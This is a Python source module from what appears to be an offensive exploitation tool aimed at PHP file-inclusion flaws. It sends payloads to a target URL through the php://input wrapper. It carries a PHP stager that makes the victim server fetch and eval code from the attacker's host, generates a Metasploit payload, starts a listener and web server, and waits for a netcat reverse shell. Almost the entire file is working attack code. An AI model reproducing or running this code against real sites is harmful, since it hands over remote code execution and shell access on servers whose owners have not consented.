import subprocess
from os.path import abspath, dirname, join

from .utils import listener, attack, colors, cook, msf_payload

from .Detection import Detection

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
HERE = abspath(dirname(__file__))


class Input:
    def __init__(self, args):
        self.target = args.url
        self.nostager = args.nostager
        self.cookies = args.cookies
        self.detection = args.detection

    def attack(self, payload):
        wrapper = "php://input"

        if self.cookies:
            cookies = cook(self.cookies)
            response = attack(self.target, wrapper, cookies=cookies, data=payload)
        else:
            response = attack(self.target, wrapper, data=payload)
        return response

    def execute_input(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        lhost, lport, shell = msf_payload()
        wrapper = "php://input"

        file = join(HERE, "Server.py")
        if self.nostager:
            with open("/tmp/{0}.php".format(shell), "r") as f:
                payload = f.read()
        else:
            payload = STAGER.format(lhost, shell)

        handle = listener(lhost, lport)
        handle.handler()

        print(colors("[~] Starting Web Server ... ", 93))

        try:
            p = subprocess.Popen(
                ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
            )
            p.communicate()
        except OSError as e:
            print(colors("[!] Process Error", 91))
            print(e)

        input(
            colors(
                "[?] Press Enter To Continue When Your netcat listener is Running ...",
                94,
            )
        )

        if self.cookies:
            cookies = cook(self.cookies)
            attack(self.target, wrapper, cookies=cookies, data=payload)
        else:
            attack(self.target, wrapper, data=payload)
